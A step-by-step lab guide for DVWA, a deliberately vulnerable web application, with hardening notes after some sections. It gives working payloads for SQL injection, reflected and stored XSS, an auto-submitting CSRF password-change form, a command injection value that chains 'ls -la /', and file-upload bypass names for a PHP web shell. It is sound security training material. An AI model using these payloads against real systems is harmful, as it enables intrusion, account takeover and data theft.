# DVWA Labs – Step-by-Step Exercises  
A Complete Web Exploitation Training Path

This lab guide walks you through the most important DVWA modules.  
Each section includes:

- Objective  
- How the vulnerability works  
- Step-by-step exploitation  
- What to observe  
- Hardening notes  

This is exactly how a real DevSecOps engineer builds their offensive/defensive understanding.

---

# 1. SQL Injection (LOW)

##  Objective
Extract all users from the DVWA database using SQL Injection.

## Background
The login parameter is not sanitized:

```
?id=1
```

can be turned into:

```
?id=1 OR 1=1
```

which forces the SQL query to always return TRUE.

---

##  Step-by-Step Attack

1. Go to: **SQL Injection Module**
2. Set DVWA security level to **Low**
3. Enter payload:

```
1' OR 1=1 --
```

4. You should see all users dumped.

---

## 🔎 What to Observe
- Server reflects raw SQL results  
- Error messages leak database structure  
- No input validation  

---

## 🛡 Hardening Notes
- Use prepared statements  
- Use strict escaping  
- Disable verbose errors  

---

# 2. Reflected XSS (LOW)

##  Objective
Execute JavaScript in the victim browser.

##  Attack Steps

1. Navigate to **XSS (Reflected)**
2. Input:

```html
<script>alert('XSS');</script>
```

3. The browser pops an alert.  
4. Capture request in Burp and modify parameters.

---

## 🛡 Hardening Notes
- Apply HTML encoding  
- Use Content-Security-Policy  
- Sanitize JS events (onload, onclick)  

---

# 3. Stored XSS (LOW)

##  Objective
Store a persistent payload that executes on all page visits.

##  Attack Steps

1. Go to **XSS (Stored)**
2. Submit a comment:

```html
<img src=x onerror=alert('Hacked')>
```

3. Refresh the page → Payload executes automatically.

---

# 4. CSRF (LOW)

##  Objective
Trigger a forced password change for a victim admin.

##  Attack Steps

1. Turn on BurpSuite Proxy  
2. Capture the password-change request  
3. Craft a malicious form:

```html
<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/?" method="POST">
<input type="hidden" name="password_new" value="hacked">
<input type="hidden" name="password_conf" value="hacked">
<input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit()</script>
```

4. Save as `csrf.html`  
5. Open it → Password changes without interaction.

---

# 5. Command Injection

Payload example:

```
8.8.8.8; ls -la /
```

Observe file dumping.

---

# 6. File Upload Bypass

Upload:

```
shell.php
```

If blocked, rename:

```
shell.php.jpg
shell.phtml
shell.php;.jpg
```

Access shell via:

```
/dvwa/hackable/uploads/shell.php
```

---

#  More Labs Included in DVWA

- Weak IDOR  
- Brute Force  
- File Inclusion  
- CAPTCHAs  
- ReCAPTCHA bypass  
- Weak hashing  

---

# ✔ End of DVWA Labs  
Level progression:

**Low → Medium → High → Impossible**
